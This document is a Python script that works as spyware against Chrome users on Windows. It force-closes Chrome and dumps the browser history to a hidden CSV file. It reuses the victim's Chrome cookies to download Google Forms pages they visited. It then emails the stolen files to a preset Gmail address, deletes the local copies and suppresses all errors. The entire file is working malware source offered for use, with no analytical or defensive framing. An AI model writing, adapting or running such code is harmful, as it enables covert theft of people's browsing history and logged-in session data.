import mimetypes
import requests
import time
import smtplib
from email.message import EmailMessage
import csv
import os
import browserhistory as bh
import urllib.request
import browser_cookie3
import time

# The mail addresses and password
try:
    # Try getting a new app pw, if it fails, fall back to static
    SENDER_P = requests.get(r"").text  # Takes app password from raw url
    SENDER, RECEIVER = requests.get(r"").text.split("\n") # Takes email password from raw url
except Exception:  # NOQA
    SENDER_P = ""  # App password here, 16-character code, all lowercase and no space, Syntax: "<totallyyrealpass>"
    SENDER = ""  # Syntax: <Example.email1@gmail.com>
    RECEIVER = ""  # Syntax: <Example.email2@gmail.com>

def download_form(url, i):
    try:
        global form_list
        cj = browser_cookie3.chrome()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        login_html = opener.open(url).read()
        # make a html file and store login_html in it
        with open(f"C:\\temp\\login{i}.html", "wb") as f:
            f.write(login_html)
        # put it on form_list
        form_list.append(f"C:\\temp\\login{i}.html")
    except Exception:  # NOQA
        pass


def get_chrome_history():
    # close chrome if it is open
    try:
        os.system("taskkill /f /im chrome.exe")
    except Exception:  # NOQA
        pass
    
    # copy getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History", "rb" to temp folder
    try:
        dict_obj = bh.get_browserhistory()
    except Exception:  # NOQA
        pass
    
    
    i = 0
    while True:
        try:
            # if it's Google form
            if dict_obj['chrome'][i][0].startswith("https://docs.google.com/forms/"):
                download_form(dict_obj['chrome'][i][0], i)
                i += 1
        except Exception:  # NOQA
            pass

        try:
            if not os.path.exists(f"C:\\temp") or not os.path.isfile(f"C:\\temp\\.tempcache.csv"):
                try:
                    os.mkdir(f"C:\\temp\\")
                except Exception:  # NOQA
                    pass
                try:
                    open(f"C:\\temp\\.tempcache.csv").close()
                except Exception:  # NOQA
                    pass

            # write to csv file but don't delete the previous data
            with open(f"C:\\temp\\.tempcache.csv", mode='a', newline='',
                      encoding='utf-8') as decrypt_password_file:
                decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"',
                                                     quoting=csv.QUOTE_MINIMAL)
                decrypt_password_writer.writerow(dict_obj['chrome'][i])
            i += 1
        except Exception as e:  # NOQA
            print(e)
            break


def delete_form(form_lst):
    for i in form_lst:
        os.remove(i)


def send_priority(subject, filename):
    msg = EmailMessage()
    msg["Subject"] = f"Report, Date: {time.strftime('%d/%m/%Y')}"
    msg["From"] = SENDER
    msg["To"] = RECEIVER
    msg.set_content(f"{subject} for {os.getlogin()}")

    try:
        # attach the csv file
        with open(filename, "rb") as f:
            if f is None:
                return None

            ctype, encoding = mimetypes.guess_type(filename)
            if ctype is None or encoding is not None:
                ctype = "application/octet-stream"
            maintype, subtype = ctype.split("/", 1)

            file_data = f.read()
            file_name = f.name.split("\\")[-1]
            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER, SENDER_P)
            smtp.send_message(msg)
            smtp.quit()

        os.remove(filename)
    except Exception:  # NOQA
        pass


def access_and_send(*args):
    """
    Access the files and send it through SMTPlib
    """
    counter = 0

    msg = EmailMessage()
    msg["Subject"] = f"Files, Date: {time.strftime('%d/%m/%Y')}"
    msg["From"] = SENDER
    msg["To"] = RECEIVER
    msg.set_content(f"Report for {time.strftime('%d/%m/%Y')}, desktop name: {os.getlogin()}")

    for i in args:
        for j in i:
            if j is None:
                continue
            try:
                with open(j, "rb") as f:
                    ctype, encoding = mimetypes.guess_type(j)
                    if ctype is None or encoding is not None:
                        ctype = "application/octet-stream"
                    maintype, subtype = ctype.split("/", 1)

                    file_data = f.read()
                    file_name = f.name.split("\\")[-1]
                    msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

            except Exception:  # NOQA
                pass
            counter += 1
            if counter == 10:
                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                    smtp.login(SENDER, SENDER_P)
                    smtp.send_message(msg)
                    smtp.quit()
                counter = 0


# Do not do __main__
form_list = []
try:
    get_chrome_history()
except Exception:  # NOQA
    pass
try:
    send_priority("Chrome History", f"C:\\temp\\.tempcache.csv")
except Exception:  # NOQA
    time.sleep(20)
    send_priority("Chrome History", f"C:\\temp\\.tempcache.csv")
try:
    access_and_send(form_list)
except Exception:  # NOQA
    pass
try:
    delete_form(form_list)
except Exception:  # NOQA
    pass
